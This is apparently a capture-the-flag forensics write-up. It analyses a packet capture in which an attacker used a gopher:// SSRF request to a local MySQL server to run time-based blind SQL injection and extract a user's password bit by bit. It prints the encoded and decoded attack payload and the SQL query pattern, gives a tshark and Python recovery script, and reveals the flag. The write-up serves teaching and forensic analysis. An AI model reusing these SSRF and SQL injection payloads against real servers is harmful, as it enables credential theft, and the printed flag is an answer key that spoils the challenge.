# Exfil

We think our website has been compromised by a bad actor. We have noticed some weird traffic coming from a user, could you figure out what has been exfiltrated?

# Solution

## TL;DR Version

This is a capture of a time-based blind SQL injection attack that exfiltrates the password of a user by querying each bit of every ASCII character in the string.

Use this to get the relevant timestamps of the requests querying the password:
```bash
tshark -r capture.pcap -Y 'frame.number >= 10325 && http' -T fields -e frame.time_epoch > times
```

Use this to recover the password (which is the flag) from the timestamps:
```python
with open("times") as f:
	times = [float(l) for l in f]
	deltas = [str(int(abs(times[i] - times[i + 1]) > 1)) for i in range(0, len(times), 2)]
	flag = ""
	for i in range(0, len(deltas), 8):
		flag += chr(int("".join(deltas[i:i + 8]), 2))
	print(flag)
```
Here's the flag:
`HTB{b1t_sh1ft1ng_3xf1l_1s_c00l}`

## The Long Version

### Tools
- Wireshark/tshark
- Python
- Bash 
- The Internet/our brains

### The Process
Our hint isn't very specific, so let's begin by opening `capture.pcap` in Wireshark and inspecting the first HTTP packet (packet #4) since HTTP is usually easy to understand. 

The user-agent is `python-requests/2.22.0`, which implies `172.17.0.1` is the attacker because people typically don't use automated tools unless they're doing something malicious.

Upon examining the first POST request (packet #18) from the attacker, we see a very suspicious JSON payload:

```json
{
	"url": "gopher://0:3306/_%a3%00%00%01%85%a6%3f%20%00%00%00%01%08%00%01%02%03%04%05%06%07%08%09%0a%0b%0c%0d%0e%0f%10%11%12%13%14%15%16%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%39%04%5f%70%69%64%04%31%33%33%37%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%09%5f%70%6c%61%74%66%6f%72%6d%07%5f%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%7c%00%00%00%03%53%45%4c%45%43%54%20%53%4c%45%45%50%28%28%53%45%4c%45%43%54%20%41%53%43%49%49%28%73%75%62%73%74%72%28%28%53%45%4c%45%43%54%20%67%72%6f%75%70%5f%63%6f%6e%63%61%74%28%64%61%74%61%62%61%73%65%5f%6e%61%6d%65%29%20%46%52%4f%4d%20%6d%79%73%71%6c%2e%69%6e%6e%6f%64%62%5f%74%61%62%6c%65%5f%73%74%61%74%73%29%2c%20%31%2c%20%31%29%29%20%3e%3e%20%37%20%26%20%31%29%20%2a%20%33%29%01%00%00%00%01"
}
```

The percent signs are a giveaway that the payload is URL encoded, so let's use [this online tool](https://www.urldecoder.org/) to decode it. Here's the results after cleaning up the non-printable characters:

```
gopher://0:3306/_? 	
rootmysql_native_passwordf
_os Linux 
_client_version 5.7.29
_pid 1337
_client_name libmysql
_platform _x86_64
program_name mysql| 
SELECT SLEEP((SELECT ASCII(substr((SELECT group_concat(database_name) FROM mysql.innodb_table_stats), 1, 1)) >> 7 & 1) * 3)
```

There are 2 important things to take note of here: the `gopher` protocol and the presence of a MySQL server. After Googling "gopher mysql exploit," I found [this writeup](https://tarun05blog.wordpress.com/2018/02/05/ssrf-through-gopher/) and learned that this protocol can be (ab)used to talk to MySQL databases.

Given this information and the use of `SLEEP` in the query itself, we're looking at a [time-based blind SQL injection attack](https://owasp.org/www-community/attacks/Blind_SQL_Injection). 

As a recap, this type of attack indirectly acquires information from an SQL database by deliberately delaying the server's response if the query is a success. By recording the time it takes for a request to make a round-trip, we can determine if the query was successful or not (there's no need for visual/direct feedback from the server). We can verify this in our capture by examining the timestamps between a given POST request and its response; some take almost no time while others take approximately 3 seconds. 

> Note that we can directly examine the SQL queries in the POST requests by examining the contents of subsequent MySQL packets (no need to URL decode anything from now on). 

Now, let's take a closer look at the general structure of the SQL queries being sent. Note that `secret_string`, `i`, and `j` are placeholders I put to represent values that vary between requests:

```sql
SLEEP((SELECT ASCII(substr((secret_string, i, 1)) >> j & 1) * 3)
```

Here's what each component does:
- `substr(secret_string, i, 1)`: Returns the character at index `i` in `secret_string` (1-based, starting from the left). `i` varies from 1 to the length of `secret_string`, inclusive. This is because the attacker wanted to examine every character in `secret_string`.
- `SELECT ASCII(...)`: Returns the corresponding ASCII character code as a positive integer.
- `... >> j & 1`: Bitwise shifts right `j` times, then bitwise ANDs the result with 1. This effectively returns the value of the bit at index `j` (0-based, starting from the rightmost bit). `j` varies from 7 to 0, inclusive. This is because the attacker examined the most significant bit first, then examined bits of lower significance until they reached the least significant bit. There are 8 bits because ASCII characters are represented by a single byte, which is 8 bits.
- `SLEEP(... * 3)`: Makes the server sleep for 3 seconds if the value of the bit is 1 (1 * 3 = 3); otherwise, this does nothing (0 * 3 = 0).

By repeating this process of examining every bit of every character in `secret_string`, the attacker obtained perfect information about whatever they wanted. Scary!

Now that we've figured out the attacker's precise method of exfiltration, let's determine what information the attacker actually exfiltrated. After manually glancing over a couple of different SQL queries, we can see that the value of `secret_string` changes, so the attacker exfiltrated several different pieces of information. It's very likely that only one of these fields contains the flag, so we need to examine a subset of the total requests made. As an educated guess, let's look at the last series of requests issued before the end of the capture (if I were a hacker, I would leave after I got what I wanted, so it makes sense to check the last series of requests). After some trial and error, we can determine that the first SQL query to examine the last value of `secret_string` is issued in packet #10325. 

Here's the actual SQL query:

```sql
SLEEP((SELECT ASCII(substr((SELECT password FROM db_m3149.users), 1, 1)) >> 7 & 1) * 3)
```

A password? Very suspicious! For sanity check purposes, here's the last SQL query from the same request series, issued in packet #17242:

```sql
SLEEP((SELECT ASCII(substr((SELECT password FROM db_m3149.users), 31, 1)) >> 0 & 1) * 3)
```

Based on that last SQL query, we can deduce that there were 31 characters in the password, so there should be 496 HTTP packets we need to look at (2 * 8 * 31 = 496; 2 for the initial request and its response, 8 for the number of bits in a character, and 31 for the number of characters). 

Since there are no other HTTP packets after the last SQL query, we can just select all the HTTP packets with a packet number greater than or equal to 10325. Since we just want the timestamps, `tshark` is a great tool for this.

Here's an invocation that'll put all the timestamps in a file named `times` for further processing:

```bash
tshark -r capture.pcap -Y 'frame.number >= 10325 && http' -T fields -e frame.time_epoch > times
```

Here's a quick breakdown of how it works:
- `-r capture.pcap`: Specifies the capture file that we want to read from.
- `-Y 'frame.number >= 10325 && http'`: Filters the packets using Wireshark's display filter for our criteria mentioned above.
- `-T fields -e frame.time_epoch`: Only prints the UNIX timestamps (the number of seconds since January 1, 1970) for each packet. It's important to use `frame.time_epoch` rather than `frame.time` because we want to do math with these numbers (`frame.time` is a human-readable format that would be gross to do math with).

Running a quick `wc -l times` gives us 496 lines, which is exactly what we need!

Now, all we need to do is reconstruct the original string from our timestamps. Here's an outline of how to do that:
1. Parse the timestamps into a list of numbers.
2. For every 2 timestamps, take their difference. If the magnitude is greater than 1, then we'll emit a 1, which represents a successful query. Otherwise, we'll emit a 0. Note that we compare against 1 instead of 3 because there may have been some fluctuation in the timing of the responses. After this step, we'll have a list of length 248 (496 / 2 = 248).
3. For every 8 numbers, treat them as binary digits, then parse them to an integer. After this step, we'll have a list of length 31 (248 / 8 = 31).
4. For every number, convert it into its ASCII character equivalent.
5. Concatenate all the characters together. This is the flag!

Here's a compressed version of that in Python:
```python
with open("times") as f:
	times = [float(l) for l in f]
	deltas = [str(int(abs(times[i] - times[i + 1]) > 1)) for i in range(0, len(times), 2)]
	flag = ""
	for i in range(0, len(deltas), 8):
		flag += chr(int("".join(deltas[i:i + 8]), 2))
	print(flag)
```

At long last, our journey is over! Here's the flag:

`HTB{b1t_sh1ft1ng_3xf1l_1s_c00l}`
